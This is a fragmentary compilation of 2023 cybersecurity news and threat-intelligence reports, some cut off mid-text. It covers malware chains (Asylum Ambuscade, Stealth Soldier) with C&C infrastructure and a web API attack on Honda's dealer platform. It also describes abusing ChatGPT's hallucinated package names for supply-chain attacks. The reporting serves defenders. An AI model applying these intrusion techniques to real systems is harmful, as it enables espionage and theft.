machine. An analysis of the group’s toolset is provided later in the blogpost.Even though the group came into the spotlight because of its cyberespionage operations, it has been mostly running cybercrime campaigns since early 2020.Since January 2022, we have counted more than 4,500 victims worldwide. While most of them are located in North America, as shown in Figure 2, it should be noted that we have also seen victims in Asia, Africa, Europe, and South America.Figure 2. Geographical distribution of victims since January 2022The targeting is very wide and mostly includes individuals, cryptocurrency traders, and small and medium businesses (SMBs) in various verticals.While the goal of targeting cryptocurrency traders is quite obvious – stealing cryptocurrency – we don’t know for sure how Asylum Ambuscade monetizes its access to SMBs. It is possible the group sells the access to other crimeware groups who might, for example, deploy ransomware. We have not observed this in our telemetry, though.Asylum Ambuscade’s crimeware compromise chain is, overall, very similar to the one we describe for the cyberespionage campaigns. The main difference is the compromise vector, which can be:Figure 3. 404 TDS redirection chain, as captured by urlscan.io – numbers indicate the redirections in sequenceIn addition to the different compromise vector, the group developed SunSeed equivalents in other scripting languages such as Tcl and VBS. In March 2023, it developed an AHKBOT equivalent in Node.js that we named NODEBOT. We believe those changes were intended to bypass detections from security products. An overview of the compromise chain is provided in Figure 4.Figure 4. Compromise chainWe believe that the cyberespionage and cybercrime campaigns are operated by the same group.As such, we believe that Asylum Ambuscade is a cybercrime group that is doing some cyberespionage on the side.We also believe that these three articles describe incidents related to the group:In most crimeware campaigns run by the group, the compromise vector is not a malicious document, but a JavaScript file downloaded from the previously documented TDS. Note that it has to be manually executed by the victim, so the attackers are trying to entice people into clicking on the files by using filenames such as Document_12_dec-1532825.js, TeamViewer_Setup.js, or AnyDeskInstall.js.Those scripts are obfuscated using random variable names and junk code, most likely intended to bypass detections. An example is provided in Figure 5.Figure 5. Obfuscated JavaScript downloaderOnce deobfuscated, this script can be summarized in two lines:The first stage downloaders are dropped by an MSI package downloaded by either a malicious document or a JavaScript file. There are three versions of this downloader:SunSeed is a downloader written in the Lua language and heavily obfuscated, as shown in Figure 6.Figure 6. The SunSeed Lua variant is heavily obfuscatedOnce manually deobfuscated, the main function of the script looks like this: It gets the serial number of the C: drive and sends a GET request to http://<C&C>/<serial_number> using the User-Agent LuaSocket 2.0.2. It then tries to execute the reply. This means that SunSeed expects to receive additional Lua scripts from the C&C server. We found two of those scripts: install and move.install is a simple Lua script that downloads an AutoHotkey script into C:\\ProgramData\\mscoree.ahk and the legitimate AutoHotkey interpreter into C:\\ProgramData\\mscoree.exe, as shown in Figure 7. This AutoHotkey script is AHKBOT, the second stage downloader.Figure 7. Lua script that downloads an AutoHotkey scriptAn even simpler Lua script, move, is shown in Figure 8. It is used to reassign management of a victimized computer from one C&C server to another. It is not possible to update the hardcoded SunSeed C&C server; to complete a C&C reassignment, a new MSI installer needs to be downloaded and executed, exactly as when the machine was first compromised.Figure 8. Lua script to move management of a compromised machine from one C&C server to anotherAs mentioned above, we found another variant of SunSeed developed using the Tcl language instead of Lua, as shown in Figure 9. The main difference is that it doesn’t send the C: drive’s serial number in the GET request.Figure 9. SunSeed variant in TclThe third variant was developed in VBS, as shown in Figure 10. The main difference is that it doesn’t download and interpret additional code, but downloads and executes an MSI package.Figure 10. SunSeed variant in VBSThe main second-stage downloader is AHKBOT, developed in AutoHotkey. As shown in Figure 11, it sends a GET request, with the User-Agent AutoHotkey (the default value used by AutoHotkey), to http://<C&C>/<serial_number_of_C_drive>-RP, almost exactly as the earlier SunSeed. RP might be a campaign identifier, as it changes from sample to sample.Figure 11. AHKBOTAHKBOT can be found on disk at various locations, such as C:\\ProgramData\\mscoree.ahk or C:\\ProgramData\\adb.ahk. It downloads and interprets spy plugins, also developed in AutoHotkey. A summary of the 21 plugins is provided in Table 1.Table 1. SunSeed pluginsand send to the C&C server.This plugin looks very similar to the password stealer described by Trend Micro in 2020, including the hard drive serial numbers used for debugging: 605109072 and 2786990575. This could indicate that it is still being developed on the same machines.The plugins send the result back to the C&C server using a log function, as shown in Figure 12.Figure 12. Log functionIn March 2023, the attackers developed a variant of AHKBOT in Node.js that we have named NODEBOT – see Figure 13.Figure 13. NODEBOTThe attackers also rewrote some AHKBOT plugins in JavaScript to make them compatible with NODEBOT. So far, we have observed the following plugins (an asterisk indicates that the plugin is new to NODEBOT):Asylum Ambuscade is a cybercrime group mostly targeting SMBs and individuals in North America and Europe. However, it appears to be branching out, running some recent cyberespionage campaigns on the side, against governments in Central Asia and Europe from time to time.It is quite unusual to catch a cybercrime group running dedicated cyberespionage operations, and as such we believe that researchers should keep close track of Asylum Ambuscade activities.\n\n\nSHA-1\nFilename\nESET detection

      "title": "Stealth Soldier Backdoor Used in Targeted Espionage Attacks in North Africa - Check Point Research",
      "text": " Check Point Research identified an ongoing operation against targets in North Africa involving a previously undisclosed multi-stage backdoor called Stealth Soldier. The malware Command and Control (C&C) network is part of a larger set of infrastructure, used at least in part for spear-phishing campaigns against government entities. Based on what we observed in the phishing website themes and VirusTotal submissions, the campaign appears to target Libyan organizations.Our investigation began when we came across multiple files submitted to VirusTotal from Libya between the months of November 2022 to January 2023. The file names were in Arabic: هام وعاجل.exe (Important and Urgent.exe) and برقية 401.exe (Telegram 401.exe), while the latest uses this name in regards to the Telegraph, and not the Telegram application. Analysis of the files reveals that all of them are downloaders for different versions of the same malware, internally named Stealth Soldier.Stealth Soldier is a custom implant, likely used in a limited set of targeted attacks. The implant enables surveillance operations and supports functionality such as keystroke logging and screenshot and microphone recordings. The different versions found suggest that Stealth Soldier is actively maintained as of January 2023, the compilation timestamp of its latest version.The execution flow for all Stealth Soldier versions begins with the execution of the downloader, which triggers the infection chain. Although the delivery mechanism of the downloader is currently unknown, the names suggest they were delivered using social engineering. The malware infection chain is complex and contains several files, all of which are downloaded from the C&C server. During the infection process, the malware downloads a total of 6 (!) files from the C&C servers. The main ones are:The workflow below details the full execution scheme of Stealth Soldier Version 9.The flow is similar for all versions of the malware, with the main difference being the payload and the C&C server. Version 6 communicates with filestoragehub[.]live, Version 8 communicates with customjvupdate[.]live and Version 9 communicates to filecloud[.]store.The payload starts by collecting information from the victim:The information is sent in different packets and XORed with the key string “Windows Cmd” to the IP 94.156.33.228.The post request has the following headers:The malware sends the string Request for new tasks to the C&C, which responds with the commands.The malware uses different types of commands: some are plugins that are downloaded from the C&C and some are modules inside the malware. For example, MicRecord runs in the context of the malware itself and not as an external plugin. The recording is performed using the mciSendStringA API and the following command lines:Below is the full list of supported Stealth Soldier commands:The payload runs several plugins: first it downloads them, then writes to their respective filenames, and finally executes. At the time of our analysis, some of the modules were no longer available for download.Screen CaptureThe screen capture plugin is called sc.exe and is downloaded from the C&C server. It is a compiled .NET open-source project named https://github.com/bencevans/screenshot-desktop. The module supports the following arguments (can be seen using the flag /h or /help)The default name for the screenshot is screenshot.bmp for full-screen screenshots. The module also supports screenshots of a specific window.Browser CredentialsThis plugin is called BrCr.txt. It starts with another loader that downloads the next stage from the URI /BRCRLa_enc.txt, decrypts and writes it to C:\\Users\\Public\\BRCRLa.exe, and then executes it. It is followed by another layer of downloads that retrieve the final payload from /BRCRShc.txt. The module runs in memory after it is decrypted: the loader runs it from the first byte which is part of the MZ header. This header calls to a shellcode that resides at the end of the file. The shellcode loads the file itself and then runs from the entry point.The malware’s different stages use the same kind of encryption for their strings, communication and payloads. Most of the time the encryption is XORed with 2 hardcoded strings (even though in the payload the strings are XORed with only one hardcoded string). The strings used as XOR keys masquerade as legitimate strings which makes it harder to spot the malware.The different XOR keys we encountered are:We observed 3 infection chains of Stealth Soldier malware with different versions depending on the payload – 6, 8 and 9. The flows were pretty similar, and had the same logic. The differences between the versions indicate active deployment and possible rearrangement of plugins. For example, the payloads in earlier versions (before Version 9) didn’t contain the BrowserCreds module.Additional differences include the filenames, mutex names, XOR keys and directory names. There is also a difference in the values set to the SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run for persistence:The watchdog also changed between the versions. In Version 6 it only checks if the second stage (MSCheck.exe) exists and if it doesn’t, downloads a new one with the same name.In Version 8, the MSCheck.exe watchdog checks if the second-stage loader MSUpdate.exe exists in the directory MSTemp.  If it doesn’t, the watchdog tries to read and decrypt from MSUVersion.txt an address from which to download an updated version. This is different from Version 9 where the update mechanism tries directly to download the whole file. In Version 9’s C&C server [filecloud.store](http://filecloud.store), we found an MSUVersion.txt file that leads to https://msheartbeat[.]live/sensaxcv/MSUpdate2.txt address, which can show traces of using this C&C in the past.Historic PDNS resolutions reveal the C&C domains customjvupdate[.]live and filestoragehub[.]live resolved in the past to IP addresses in the same ASN on the IP range 185.125.230.0/24. Actively hunting for malicious activity within this ASN, we were able to retrieve a limited set of domains that were likely used to impersonate the Libyan Ministry of Foreign Affairs in a phishing attempt. Among those domains were :The newly-found phishing domains were hosted on IPs containing additional phishing domains with similar registration patterns. Pivoting off those patterns and using hosting history and similar naming conventions, mostly combinations of the keywords mail/notify/verify/web/log/live, we were able to identify more than 50 domains with similar characteristics.Most of the domains were unresponsive during our analysis. Many of them have subdomains with name patterns such as “mail.yahoo”, “livemail”, “telegram.org” and “login.outlook”, which strongly suggests that they were intended to be used in a phishing campaign.The Version 8 C&C customejvupdate[.]live resolved by the IP 185.125.230.116 was also resolved by multiple Eye on the Nile domains: weblogin.live,mailsecure.live,verifymail.live. In addition, the naming convention used in the phishing domains cluster: mail/notify/verify/web/log/live is the same one used in the Eye on the Nile campaign.Throughout the analysis of Stealth Soldier campaigns, we were able to identify several infrastructure overlaps with known Eye on the Nile domains. This adds up to the narrow regional targeting and similar phishing domain naming patterns.This report describes a previously undocumented malware campaign targeting Libya, a country that is not often the focus of APT reports. The investigation suggests that the attackers behind this campaign are politically motivated and are utilizing the Stealth Soldier malware and a significant network of phishing domains to conduct surveillance and espionage operations against Libyan and Egyptian targets.Given the modularity of the malware and the use of multiple stages of infection, it is likely that the attackers will continue to evolve their tactics and techniques and deploy new versions of this malware in the near future.Finally, our analysis revealed a connection to the previously exposed “Eye on the Nile” campaign. This connection raises the possibility that the current operation may have additional undetected components, such as a mobile backdoor that was used in the earlier campaign but was not observed since.Check Point Threat Emulation:Check Point Anti-Bot:Subscribe for cpr blogs, news and more© 1994- Check Point Software Technologies LTD.

      "text": " A hacking group tracked as 'Asylum Ambuscade' was observed in recent attacks targeting small to medium-sized companies worldwide, combining cyber espionage with cybercrime.Asylum Ambuscade typically launches its attacks with spear-phishing emails sent to targets, carrying malicious document attachments that run malicious VBS code, and after June 2022, an exploit for CVE-2022-30190 (Follina).The exploit initiates the download of an MSI installer that deploys the group's Sunseed malware, a Lua-based downloader that also generates an LNK file in the Windows Startup folder for persistence.Sunseed procures the subsequent-stage payload, Akhbot, from the command-and-control server and continues to ping the server to receive and execute additional Lua code.Asylum Ambuscade maintains an almost perplexingly broad targeting scope in 2023, targeting bank customers, cryptocurrency traders, government entities, and various small and medium businesses across North America, Europe, and Central Asia.ESET explains that the current infection chain continues to follow the same structure as in the 2022 operations. However, security analysts have now noticed new compromise vectors, including malicious Google Ads that redirect users to sites running malicious JavaScript code.Additionally, the threat actor started deploying a new tool named \"Nodebot\" in March 2023, which appears to be the Node.js port of Ahkbot.The malware's function continues to include screenshot capturing, password exfiltration from Internet Explorer, Firefox, and Chromium-based browsers, and fetching additional AutoHotkey plugins onto the breached device.The plugins fetched by the malware feature specific functionality such as downloading a VMProtect-packed Cobalt Strike loader, installing Chrome to accommodate hVNC operations, starting a keylogger, deploying a Rhadamanthys infostealer, launching a commercially available RAT, and more.ESET has counted 4,500 victims since it started tracking Asylum Ambuscade in January 2022, equating to roughly 265 victims/month, making this a very prolific threat actor and a severe threat to organizations worldwide.While the threat actors clearly target cryptocurrency traders and bank accounts for profit, the compromise of SMB entities might point to cyberespionage.The threat group may be selling network access to these companies to ransomware affiliates for profit. However, ESET has found no evidence supporting this hypothesis.In conclusion, Asylum Ambuscade's specific operational goals remain unclear."

      "text": " Google Chrome is getting new security-enhancing features for the built-in Password Manager, making it easier for users to manage their passwords and stay safe from account hijacking attacks.Today, Google announced five new and already available features that further empower the security of data stored in its Password Manager and set safeguards that protect users from exposure to risks.The first new feature is the addition of a dedicated desktop shortcut for Google Password Manager, allowing users to quickly access and manage all their stored account credentials, modify autofill settings, and more.The second addition is the introduction of biometric authentication on the desktop, which has so far been available only on mobile platforms.This will enable users to set an extra layer of security by requiring additional biometric or Windows Hello authentication, such as fingerprints or facial recognition, before the password manager will auto-fill a site's credentials.Another new \"quality of life\" feature is the ability to save custom notes with each of your saved logins, allowing you to save other information required to log in to an account.For example, some websites require additional information to log in, such as security questions or PINs, which can now be saved in the notes.The fourth feature promoted by Google is the ability to import passwords from other password managers, which can now be done by exporting a CVS file from the old tool and importing it on Chrome.Google Chrome currently supports importing passwords from Edge, Safari, 1Password, Bitwarden, Dashlane, and LastPass.It should be noted that storing passwords in your web browser brings additional risk, as these credentials are commonly sought and stolen by information-stealing malware.These malware infections will scan for installed browsers, access the browser's database, and steals these credentials for further attacks or to be sold on dark web markets.However, even with these risks, many people continue to use their browser to store credentials due to its ease of use, and in many cases, the constant prompts to save passwords.Therefore, any enhancements to the security of Google Password Manager are welcomed and poised to improve the safety of millions of accounts."

      "text": " Pharmaceutical company Eisai has disclosed it suffered a ransomware incident that impacted its operations, admitting that attackers encrypted some of its servers.Eisai is a Tokyo-based pharmaceutical company with an annual revenue of $5.3 billion and over 10,000 employees. The company maintains nine manufacturing and fifteen medical research units in Japan, the United Kingdom, North Carolina, and Massachusetts.The company develops and produces medication for various forms of cancer and the treatment of chemotherapy side effects, as well as anti-seizure, neuropathy, and dementia drugs.In a notification posted to their website, Eisai disclosed that they suffered a ransomware attack over the weekend, a typical time for attackers to deploy encryptors as IT teams are understaffed and unable to respond effectively to the rapidly evolving situation.\"We immediately implemented our incident response plan and launched an investigation with the aid of our cybersecurity partners [and] a company-wide task force was convened to rapidly work on response procedures.\"The company took many of its IT systems offline to contain the damage and prevent the spread of the locker to further portions of the breached corporate network.Eisai explains that several of its systems, both inside and outside Japan, including logistics systems, had to be taken offline and remain out of service until investigations are concluded.However, corporate websites and email communications remain functional.The company promptly reported the incident to the relevant law enforcement authorities and enlisted external cybersecurity professionals to expedite recovery.Eisai stated that the possibility of data leakage is under investigation; hence it remains a potential risk.Similarly unclear is this cyberattack's impact on the company's consolidated earnings forecast for the current fiscal year.None of the major ransomware groups have taken responsibility for the cyberattack on their extortion sites yet, so the perpetrators are unknown.Although AtomSilo's extortion portal isn't online anymore, the data the threat group leaked on it included several MDF and LDF database dumps it allegedly stole from Eisai's network."

      "text": " Freelance JournalistA series of highly-targeted espionage attacks in North Africa has been linked to a previously undisclosed modular backdoor called “Stealth Soldier.”In particular, the Stealth Soldier backdoor features file exfiltration, screen and microphone recording, keystroke logging and stealing browser information capabilities.The CPR team highlighted one significant finding: the infrastructure associated with Stealth Soldier shows similarities with the infrastructure used by a previous campaign known as “Eye on the Nile.”The latter attacks targeted Egyptian civilian society in 2019, but the similarities with Stealth Soldier suggest a possible re-appearance of the same threat actor after a long hiatus.“What’s interesting is that this new Stealth Soldier malware signifies a re-emergence of a threat actor from 2019 which operated against Egyptian civilian society.”CPR discovered different versions of the backdoor, with the latest being Version 9, likely delivered in February 2023. The oldest version found was Version 6, compiled in October 2022. The malware’s command and control (C&C) servers appear to be connected to a more extensive set of domains, some of which masquerade as sites belonging to the Libyan Foreign Affairs Ministry, indicating the use of phishing campaigns.The security researchers added that these findings underscore the importance of robust cybersecurity measures to counter targeted espionage attacks, particularly in regions where such threats are prevalent.“The investigation suggests that the attackers behind this campaign are politically motivated and are utilizing the Stealth Soldier malware and a significant network of phishing domains to conduct surveillance and espionage operations against Libyan and Egyptian targets,” reads the advisory.“Given the modularity of the malware and the use of multiple stages of infection, it is likely that the attackers will continue to evolve their tactics and techniques and deploy new versions of this malware in the near future.”"

      "text": " Security researchers are warning about a bug in Microsoft Visual Studio installer that gives cyberattackers a way to create and distribute malicious extensions to application developers, under the guise of being a legitimate software publisher. From there, they could infiltrate development environments, taking control, poisoning code, stealing high-value intellectual property, and more.According to the posting, the bug merits attention because it's easily exploitable and exists in a product with a 26% market share and more than 30,000 customers. \"With the UI bug found by Varonis Threat Labs, a threat actor could impersonate a popular publisher and issue a malicious extension to compromise a targeted system,\" Varonis security researcher Dolor Taler wrote. \"Malicious extensions have been used to steal sensitive information, silently access and change code, or take full control of a system.\"The vulnerability that Varonis discovered affects multiple versions of the Visual Studio integrated development environment (IDE)—from Visual Studio 2017 to Visual Studio 2022. The flaw involves the ability for anyone to easily bypass a security restriction in Visual Studio that prevents users from entering information in the \"product name\" extension property.Taler discovered that by adding enough newline characters to the extension name, an attacker could force all other text in the Visual Studio installer to be pushed down, thereby hiding from sight any warnings about the extension not being digitally signed. \"And because a threat actor controls the area under the extension name, they can easily add fake 'Digital Signature' text, visible to the user and appearing to be genuine,\" Taler said.Attackers have multiple options—most involving phishing or other social engineering—for delivering a malicious extension to software developers and using it to compromise their systems, Varonis said. They could then use it as a launching pad into the organization's development ecosystem and other target-rich environments.Or Emanuel, director of research and security at Varonis, tells Dark Reading that attackers could use several approaches to trick users into executing a spoofed Visual Studio extension. \"For example, they could trick the users into clicking on a post in a developer community site that takes them to a web page to download,\" he says.\"Since devs are targeted, we're looking at potential victims that may not be security oriented and might be much more lucrative due to the potential intellectual property they're working on,\" he notes, adding that by hiding a payload to trigger upon a successful installation of an extension, threat actors are able to take their time and wait for infections and communications back from infected systems: \"In addition, malicious code could potentially be added for automated compilation and might defeat some endpoint defenses.\"All of these scenarios involve user interaction. While an attacker can relatively easily develop a convincing spoof of a legitimate Visual Studio extension, they would need to convince their target to install it. Since the infection point has to involve user interaction, the flaw is not considered as critical as a remote code execution (RCE) flaw, Sason says. \"That being said, any Visual Studio users who aren’t up to date are at risk,\" adds Emanuel.He says Varonis decided to publish its advisory only now because the company wanted to ensure organizations had plenty of time to update Visual Studio. \"it’s one of the leading IDEs, so we did not want to clue in attackers.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " The researchers discovered 60,000 different apps carrying the adware, according to the post. Moreover, the researchers expect there currently are more apps distributing the same malware in the wild, they said.The distribution of the malicious apps is notable in that it appears automated and \"organic.\" The malware appears when users search for the types of apps behind which it was hiding — a current trend in the distribution of malicious apps, the researchers said. Usually, the victims are looking for unlocked versions of paid apps, according to the research.\"In fact, modded apps are a hot commodity, with websites dedicated entirely to offering these types of packages,\" the researchers explained in the post. \"Usually, modded apps are modified original applications with their full functionality unlocked or featuring changes to the initial programming.\"When users open a website from a Google search of a \"modded\" app, they then would be redirected to a random ad page that often is a download page for malware disguised as a legitimate download, the researchers said.Since API 30, Google has removed the ability to hide the app icon on Android once a launcher is registered, the researchers explained. However, this only applies if a developer of the app registers a launcher in the first place, they said.To circumvent this, the malicious apps in the campaign do not register any launchers and rely solely on the user and the default Android install behavior to run for the first time, the researchers explained. When installing a downloaded application, the last screen in the procedure will be an \"Open\" app; in the case of the malware, this is all it needs to ensure that it will not be removed, the researchers said. On this screen, the app shows an \"application is unavailable\" message to trick the user into thinking it was never installed, according to the researchers.This then sets off a unique detection tactic, they explained in the post. The app at this point is not installed and \"sleeps for two hours before registering two 'intents' that cause the app to launch when the device is booted or unlocked,\" the researchers wrote in the post. The latter intent also is disabled for the first two days, a further anti-detection tactic, they said.\"Then, every two hours after that, the alarm is triggered, a request to the server is made, and another alarm is registered,\" the researchers wrote. \"The server can choose to initialize the adware phase at an unknown time interval.\"Upon launch, the app reaches out to the attackers' servers and retrieves ad URLs to be displayed in the mobile browser or as a full-screen WebView ad. At this point, attackers also can make the aforementioned pivot to redirect users to other types of malware, such as banking Trojans to steal credentials and financial information, or ransomware, the researchers added.Moreover, the campaign \"serves as a reminder for users to exercise caution when downloading and installing applications, particularly from unofficial sources,\" he says.BitDefender included in its post a list of domains known to be distributing the campaign's adware, some of which are not necessarily malware-related, the researchers said. They also posted a list of indicators of compromise to help users detect if they've been infected by the adware.As always, a good step for user protection is to avoid downloading apps from sources other than the official app stores.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

It was believed that this was the ransomware operation that the Royal ransomware group would rebrand into.However, a rebrand never occurred, and Royal is still actively attacking the enterprise while using BlackSuit in limited attacks.\"The group employs Royal and BlackSuit lockers, with Emotet and IcedID as precursors. They prioritize alternatives to CobaltStrike, particularly Sliver, and develop custom precursor loaders.\"Bohuslavskiy further told BleepingComputer its possible that Royal is simply testing a new encryptor, as they have been with other tools used by the group, including a new loader, IcedID, and a revitalizing of Emotet.\"They keep improving Emoted to try to revitalize it, and are working on IcedID a lot. Their experiments with new lockers are natural in this sense.\" explained Bohuslavskiy.\"I believe we may see more things like blacksuit soon. But so far, it seems that both the new loader and the new Blacksuit locker were a failed experiment.\"As BlackSuit is a self-contained operation, it's possible Royal is planning on launching a subgroup focused on certain types of victims, or it's being saved for a rebrand later.These similarities include command line arguments, code similarities, file exclusions, and similar intermittent encryption techniques.While it's unclear how BlackSuit will be used, the ransomware is actively being used in a small number of attacks.BleepingComputer is aware of at least three attacks where the BlackSuit encryptor was used, with ransoms, so far, under $1 million.Currently, the operation has one victim listed on their data leak site, but that could quickly change if the new encryptor was more heavily used.Whatever it turns out to be, network defenders should know that this new operation is backed by Royal, who have proved to have expertise in breaching networks or deploying their encryptors."

In this case, only the latter division is impacted, so owners of Honda cars or motorcycles aren't affected.For Honda, Eaton Works exploited a password reset API to reset the password of valuable accounts and then enjoy unrestricted admin-level data access on the firm's network.\"Broken/missing access controls made it possible to access all data on the platform, even when logged in as a test account,\" explains the researcher.As a result, the following information was exposed to the security researcher and possibly to threat actors leveraging the same vulnerability:The above data could be used for launching phishing campaigns, social engineering attacks, or sold on hacker forums and dark web markets.Also, having access to the dealer sites, attackers could plant credit card skimmers or other malicious JavaScript snippets.Zveare explains that the API flaw lay in Honda's e-commerce platform, which assigns \"powerdealer.honda.com\" subdomains to registered resellers/dealers.The researcher found that the password reset API on one of Honda's sites, Power Equipment Tech Express (PETE), processed reset requests without a token or the previous password, only requiring a valid email.While this vulnerability isn't present on the e-commerce subdomains login portal, the credentials switched through the PETE site will still work on them, so anyone can access internal dealership data through this simple attack.The only missing piece is having a valid email address belonging to a dealer, which the researcher procured from a YouTube video that demoed the dealer dashboard using a test account.The next step was accessing information from real dealers besides the test account. However, it would be preferable to do so without disrupting their operation and without having to reset the passwords of hundreds of accounts.The solution the researcher found was to leverage a second vulnerability, which is the sequential assignment of user IDs in the platform and the lack of access protections.This made it possible to access the data panels of all Honda dealers arbitrarily by incrementing the user ID by one until there weren't any other results.It is worth noting that the above flaw could have been exploited by Honda's registered dealers to access the panels of other dealers, and by extension, their orders, customer details, etc.The final step of the attack was to access Honda's admin panel, which is the central control point for the firm's e-commerce platform.The researcher accessed it by modifying an HTTP response to make it appear like he was an admin, giving him unlimited access to the Honda Dealer Sites platform.The above was reported to Honda on March 16, 2023, and by April 3, 2023, the Japanese firm confirmed that all problems had been fixed.Having no bug bounty program in place, Honda did not reward Zveare for his responsible reporting, which is the same outcome as in the Toyota case."

      "text": "  Large-language models (LLMs) such as ChatGPT can generate these “hallucinations,” which are URLs, references, and even entire code libraries and functions that do not actually exist. The researchers said ChatGPT will even generate questionable fixes to CVEs, and — in this specific case — offer links to coding libraries that don’t exist, either.  If ChatGPT creates fake code libraries (packages), the Vulcan Cyber researchers said attackers can use these hallucinations to spread malicious packages without using familiar techniques such as typosquatting or masquerading.  “Those techniques are suspicious and already detectable,” the researchers said. “But if an attacker can create a package to replace the ‘fake’ packages recommended by ChatGPT, they might be able to get a victim to download and use it.”This ChatGPT attack technique underscores how easy it’s become for threat actors to use ChatGPT as a tool to execute an attack, said Bar Lanyado, security researcher, Voyager18 Research Team at Vulcan Cyber.“It’s very concerning how repetitive its answers are and how easily it responds with hallucinations,” said Lanyado. “We should expect to continue to see risks like this associated with generative AI and that similar attack techniques could be used in the wild. It’s just the beginning, generative AI tech is still pretty new. From a research perspective, it’s likely that we'll see many new security findings in the coming months and years. That said, virtually all generative AI providers are working hard to decrease hallucinations and ensure that their products do not create cyber risks, and that’s reassuring.”Melissa Bischoping, director of endpoint security research at Tanium, said companies should never download and execute code they don’t understand and haven’t tested — such as open-source GitHub repos, or now ChatGPT recommendations. Bischoping said teams should evaluate for security any code they intend to run, and the team should have private copies of it. “Do not import directly from public repositories such as those used in the example attack,” said Bischoping. “In this case, attackers are using ChatGPT as a delivery mechanism. However, the technique of compromising supply chain through the use of shared/imported third-party libraries is not novel. \"Use of this strategy will continue, and the best defense is to employ secure coding practices, and thoroughly test and review code intended for use in production environments,\" she continued. \"Don’t blindly trust every library or package you find on the internet, or in a chat with an AI.”Bud Broomhead, chief executive officer at Viakoo, added that this case serves as an example of yet another chapter in the the arms race that exists between threat actors and defenders. Much of the dialogue at conferences this year such as the RSA Conference in April was around generative AI, Broomhead said, and now Vulcan Cyber has delivered a great example of how threat actors can use it. “Ideally, security researchers and software publishers can also leverage generative AI to make software distribution more secure,” said Broomhead.The industry is in the early stages of generative AI being used for cyber offense and defense, Broomhead continued, who credited Vulcan and other organization with detecting new threats in time to prevent similar exploits.“Remember, it was only a few months ago I could ask ChatGPT to create a new piece of malware and it would,\" he said. \"Now, it takes very specific and directed guidance for it to inadvertently create it — and hopefully soon even that approach will be prevented by the AI engines.” The new PCI DSS standard puts more focus on application security, with more tools, testing and documentation required of developers.After admitting responsibility for compromising Sony, a Colonial Pipeline supplier, and a Hawai'i government site, the RansomedVC group has claimed that it will be ending operations due to the arrests of six of its affiliates, reports The Record, a news site by cybersecurity firm Recorded Future.Ukraine had experienced a less than a day-long power outage in October 2022 following an attack by Russian state-sponsored hacking operation Sandworm targeted at an electrical substation amid the ongoing Russia-Ukraine war, marking the first cyberattack-related power interruption in the country since 2017, CyberScoop reports.   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": "  Two campaigns involving two different advanced persistent threat (APT) groups tied to North Korea were disclosed June 6 — one financially motivated, while the other was a social engineering campaign focused on gathering strategic intelligence.The Insikt researchers said the North Korea-linked APT groups have a history of orchestrating financially motivated campaigns targeting cryptocurrency exchanges, commercial banks, and e-commerce payment systems globally. They said these patterns, including those exhibited in the most recent TAG-71 campaign, very likely supports the North Korean government’s continued efforts to generate funds for the regime, which remains under significant international sanctions. The SentinelLabs researchers said the Kimsuky campaign aims to steal Google and subscription credentenials of a reputable news and analysis service focused on North Korea, as well as delivering reconnaissance malware. The researchers said Kimsuky engages in extensive email correspondence and uses spoofed URLs, websites imitating legitimate web platforms, and Office documents weaponized with the ReconShark malware — activity that indicated Kimsuky’s dedication to using social engineering for gathering strategic intelligence.Whether it’s a spoofing attack or social engineering, the impacts of these cyberthreats, including leaked credentials, exposure of sensitive information and financial losses are often devastating for any organization, said Teresa Rothaar, governance, risk, and compliance analyst at Keeper Security.Rothaar said these campaigns are particularly dangerous when coming from a well-resourced nation-state. Unlike a small, lone-wolf threat actor, Rothaar said a nation-state has the funding and manpower to create believable spoofs or social engineering campaigns without many common “tells,” such as poor spelling and grammar, that indicate an email or website may be illegitimate.“While a well-funded threat actor poses a particularly serious threat to any organization, the means to prevent these attacks remain the same,” said Rothaar. “The use of a password manager will prevent credentials from being harvested from a phony website because the software won’t automatically fill the user’s information if it doesn’t match the legitimate URL stored in the user’s vault. Although social engineering attacks have become increasingly convincing, especially with the growing influence of AI, basic cyber hygiene measures, including the use of strong and unique passwords for every account, coupled with rigorous employee training, will help lessen the impact of such attacks.” Menachem Shafran, vice president of product at XM Cyber, added that we see many attacks by North Korea focused on financial gain. Shafran said this includes ransomware or even many crypto-jacking attacks.“North Korea uses cyber as a means to help the country survive the sanctions which have been placed on them,” Shafran pointed out..November 10, 2023Ukraine had experienced a less than a day-long power outage in October 2022 following an attack by Russian state-sponsored hacking operation Sandworm targeted at an electrical substation amid the ongoing Russia-Ukraine war, marking the first cyberattack-related power interruption in the country since 2017, CyberScoop reports.Attacks deployed by Iranian state-backed threat operation MuddyWater against Israel saw the utilization of the new MuddyC2Go command-and-control framework, which replaced the PhonyC2 custom platform following the exposure of its source code, reports The Hacker News.On-Demand EventOn-Demand EventOn-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": " Threat actors are manipulating stolen images and videos using artificial intelligence (AI) to create deepfakes that show innocent people — including minor children and non-consenting adults — in fake but explicit sexual activity. It's part of a growing new wave of sextortionist scams, the FBI is warning.Since April, the FBI has observed an uptick in sextortion victims reporting the use of fake images or videos created from content posted on victims' social media or other websites, it said.\"Malicious actors use content manipulation technologies and services to exploit photos and videos … into sexually-themed images that appear true-to-life in likeness to a victim, then circulate them on social media, public forums, or pornographic websites,\" according to the advisory.Moreover, many of the victims didn't even know that their images had been stolen, let alone used in the deepfakes and published online, until someone notified them of their existence, the agency noted.Moreover, these threats often extend to the friends and family of more publicly recognizable people, with attackers using personal or sexually explicit info or images of loved ones to force them into meeting demands, ransom or otherwise, experts said.Sextortion scams can have ramifications not only for personal technology users, but also for organizations in cases where business leaders are targeted and face reputational implications and potential harm to their respective businesses if explicit content is exposed. Sextortionists also can coerce business leaders to make potentially unwise business decisions — such as exposing corporate data — as part of their demands when they target them with compromising photos or videos, which can even be gleaned from corporate \"about us\" pages.To avoid being targeted or compromised, the FBI urges everyone to exercise caution when posting or direct-messaging personal photos, videos, and identifying information on social media, dating apps, and other online sites, they said.\"Although seemingly innocuous when posted or shared, the images and videos can provide malicious actors an abundant supply of content to exploit for criminal activity,\" according to the advisory.To protect children from being targeted, parents and guardians of children should monitor their online activity and discuss the risks associated 